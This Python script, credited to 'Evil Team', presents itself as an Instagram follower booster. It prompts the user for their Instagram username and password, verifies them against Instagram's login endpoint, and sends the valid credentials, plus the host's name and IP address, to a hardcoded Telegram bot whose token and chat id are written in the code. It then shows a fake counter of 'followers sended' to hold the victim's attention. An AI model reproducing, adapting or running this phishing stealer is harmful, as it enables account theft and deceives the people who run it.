import socket
import os
import time
import requests
#os.system("xdg-open ")
os.system('clear')

#r = \033[1;91m
#b = \033[1;94m
#p = \033[1;95m
#g = \033[1;92m
#w = \033[1;37m

print ("""
__________________________________
|                                 |
\033[1;97m|  \033[1;91m_____  __     __  ___   _      \033[1;37m|
\033[1;37m| \033[1;91m| ____| \ \   / / |_ _| | |     \033[1;37m|
\033[1;37m| \033[1;91m|  _|    \ \ / /   | |  | |     \033[1;37m|
\033[1;37m| \033[1;91m| |___    \ V /    | |  | |___  \033[1;37m|
\033[1;37m| \033[1;91m|_____|    \_/    |___| |_____| \033[1;37m|
\033[1;37m|                                 \033[1;37m|
\033[1;37m|_________________________________\033[1;37m|

----------------------------------
\033[1;37m|      Created By \033[1;91mEvil \033[1;37mTeam      |
----------------------------------

""")

id = '1746736695'
token = 'T6125181706:AAFpep7Ncx-_GoCILzbcKZmZbZAnJ0l2TBE'
followers = 0
y = '\033[0;93m'
#the first input
acc = input ('\033[1;91m{+} \033[1;92mEnter your instgram account: ')
pac = input ('\033[1;91m{+} \033[1;92mEnter your account password: ')
#get _____ip____
hostname = socket.gethostname()
ipaddr = socket.gethostbyname(hostname)
telegram_sand = (f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=target ip\ntarget host : {hostname}\nip adress : {ipaddr}')
req = requests.post(telegram_sand)
#the header's
url_l = 'https://www.instagram.com/accounts/login/ajax/'
h = {'accept': '*/*',
         'accept-encoding': 'gzip, deflate, br',
         'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
         'content-length': '326',
         'content-type': 'application/x-www-form-urlencoded',
         'cookie': 'mid=YVvhbgALAAGEYIx5zhMwH4bDBV45; ig_did=648907BC-0061-4C67-AFF5-C72FAA705508; ig_nrcb=1; rur="LDC\05451296553316\0541675250058:01f73352f31122060f419a1c03ef57b01f1db6d027546e0dce91569f7ba529abb34ba7de"; csrftoken=nM9X5ZO6mQsQ2mbsnSVMu2fy8wd5woQe',
         'origin': 'https://www.instagram.com',
         'referer': 'https://www.instagram.com/',
         'sec-ch-ua': '" Not;A Brand";v="99", "Google Chrome";v="97", "Chromium";v="97"',
         'x-asbd-id': '198387',
         'x-csrftoken': 'nM9X5ZO6mQsQ2mbsnSVMu2fy8wd5woQe',
         'x-ig-app-id': '936619743392459',
         'x-ig-www-claim': 'hmac.AR3VqP_m-krwiZnt3-dga6AdX4Ci5cwQwDhvGD_6DT0IRX8c',
         'x-instagram-ajax': 'ee0117db2fab',
         'x-requested-with': 'XMLHttpRequest'}
d = {'enc_password': '#PWD_INSTAGRAM_BROWSER:0:1643714074:' + (pac), 'username': acc, 'queryParams': '{}',
         'optIntoOneTap': 'false', 'stopDeletionNonce': '', 'trustedDeviceRecords': '{}', }
#__dala
#the requests
r = requests.post(url_l,headers=h,data=d)
#the telegram sender
if '"authenticated":true' in r.text:
    telegram_sand = (f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=target account\npassword : {pac}\nusername : {acc}')
    req = requests.post(telegram_sand)
    print ('\033[1;95m|- Checking your email..! ')
    time.sleep(3)
    print ('\033[0;92m|- Done...!')
    time.sleep(3)
    print ('\033[1;94m|-Note: Now i will send 1500 follower to you please dont close the terminal')
    time.sleep(3)
    print ('\033[1;95m|-Note: \033[1;93mThis process can take a lot of time so dont close the wifi')
    while followers < 15001:
        followers = followers +1
        time.sleep(0.50)
        print ('\033[1;95m{=} \033[0;92mfollowers sended: ', y, followers)
else:
    print ('\033[1;95mChecking your email..! ')
    time.sleep(3)
    print ('user not found. check your password or username..!')
